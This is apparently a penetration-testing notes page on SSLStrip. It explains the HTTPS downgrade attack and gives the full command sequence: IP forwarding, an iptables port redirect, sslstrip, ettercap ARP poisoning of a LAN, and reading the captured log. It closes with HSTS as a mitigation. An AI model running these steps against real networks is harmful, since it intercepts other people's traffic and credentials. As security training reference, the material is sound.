---
description: https://github.com/moxie0/sslstrip
---

# SSLStrip

[https://github.com/kimocoder/sslstrip/](https://github.com/kimocoder/sslstrip/)

SSLStrip is a tool that takes advantage of the tendency for many HTTPS sites to receive an HTTP request from clients first that's then redirected to HTTPS.&#x20;

* Victim types in "www.instagram.com" instead of "https://www.instagram.com." This starts the connection request as a simple HTTP request that then gets redirected to HTTPS by the server.

SSLStrip proxies HTTPS traffic from the server to the victim by capturing that first accidental HTTP request to the proper SSL server but returns HTTP traffic to the victim, placing itself in the middle of the two.

It does this by rewriting all the traffic from the victim to remove any HREF or 300 error code responses that include references to HTTPS traffic.

{% hint style="info" %}
Ettercap has an SSLStrip plugin that makes this attack simpler, but it does a poor job of imitating the HTTPS server the victim is trying to access.

SSLStrip also doesn't give you the option to target specific IPs, so you may see traffic that's out of scope for your engagement. To help with that you can narrow the IP range you receive traffic from with Ettercap or another MitM tool.
{% endhint %}

1. Turn on IP forwarding on your Linux machine to allow SSLStrip to forward traffic to the SSL server.
   1. `echo "1" > /proc/sys/net/ipv4/ip_forward`
2. Redirect all HTTP traffic to the port you're listening on with SSLStrip (8080 for the example).
   1. `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`
3. Start SSLStrip listening on your port of choice. Alternatively you can use Ettercap with the SSLStrip plugin, but it can return a malformed site to the victim, tipping them off to the fact that their traffic is being altered.
   1. `sslstrip -l 8080`
   2. `ettercap -TqM arp:remote sslstrip /<Local IP Range>// /<Local IP Range>//`
4. Gain MitM position with via ARP manipulation, putting yourself in the middle of all traffic between any devices on the LAN.
   1. `ettercap -TqM arp:remote /<Local IP Range>// /<Local IP Range>//`
5. Read the SSLStrip log file to see what it found.
   1. `cat sslstrip.log`

{% hint style="info" %}
HTTPS Strict Transport Security (HSTS) headers teach browsers to always expect HTTPS traffic between themselves and the server. If the user has already interacted with the site and received the HSTS header in the past, SSLStrip won't work in this way.

HSTS records tend to last for years, so if the user has visited the site anytime in the past 2-3 years you probably won't be able to pull this attack off.
{% endhint %}
